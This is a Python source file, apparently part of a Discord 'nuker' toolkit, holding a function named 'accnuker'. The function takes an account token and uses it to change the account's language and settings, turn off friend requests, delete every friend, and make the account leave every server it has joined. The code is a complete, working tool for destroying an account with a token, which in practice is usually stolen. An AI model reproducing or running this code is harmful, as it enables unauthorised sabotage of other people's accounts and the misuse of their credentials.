################################################################

            # discord : uhq.s
            # tiktok  : https://tiktok.com/@uhq.s
            # server  : https://discord.gg/wyUuYr9DEN
            # dev     : uhq.s
            # owner   : uhq.s
            # github  : https://github.com/seized0

#################################################################

from utilities.Program.utils.utils import *
import seizcord
import random
import time
import requests


green = Fore.GREEN
red = Fore.RED
magenta = Fore.MAGENTA
blue = Fore.BLUE
r = Fore.WHITE
lmagenta = Fore.LIGHTMAGENTA_EX
lred = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
lgreen = Fore.LIGHTGREEN_EX








async def accnuker():
    os.system('cls')
    print(Colorate.Vertical(Colors.yellow_to_green,"""


     █████╗  ██████╗ ██████╗ ██████╗ ██╗   ██╗███╗   ██╗████████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ██╔══██╗██╔════╝██╔════╝██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ███████║██║     ██║     ██║   ██║██║   ██║██╔██╗ ██║   ██║       ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ██╔══██║██║     ██║     ██║   ██║██║   ██║██║╚██╗██║   ██║       ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║  ██║╚██████╗╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║   ██║       ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                            


"""))
    token = input(lgreen + '[#] ACCOUNT TOKEN : ')
    cli = seizcord.Client(token=f'{token}')

    llist = ['ru','co','hi']
    language = random.choice(llist)

    cli.disableDevMode()
    cli.changeLanguage(lang=f'{language}')
    cli.setTheme(theme='white')
    
    cli.disableFriendsRequests()
    cli.enableComptactMode()

    headers = {
        
        'Authorization': token,
        'Content-Type': 'application/json'
            }

    friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers).json()
    for friend in friends:
        if friend['type'] == 1:  
            try:
                requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers)
                print(green + f'FRIENDS DELETED SUCCESFULY :  {friend["user"]["username"]}')
            except Exception as e:
                print(red + f'FAILED TO DELETE :  {friend["user"]["username"]} - {str(e)}')

    time.sleep(2)
    header = {'Authorization': token}
    url = 'https://discord.com/api/v9/users/@me/guilds'

    response = requests.get(url, headers=header)
    guilds = response.json()

    for guild in guilds:
        guild_id = guild['id']
        print('WAIT...')
        time.sleep(1)
        url = f'https://discord.com/api/v9/users/@me/guilds/{guild_id}'
        response = requests.delete(url, headers=header)

        if response.status_code in [200, 204]:
            print(green + f'SUCCESFULY LEFT SERVER :  {guild["name"]}')
        else:
            print(red + f'FAILED TO LEAVE :  {guild["name"]} : {response.status_code}')
        time.sleep(1)  



    print(red + '\n\n[+] NUKED ACCOUNT')
    input(blue +'\n\n\n[!] PRESS ENTER TO RETURN TO MENU')
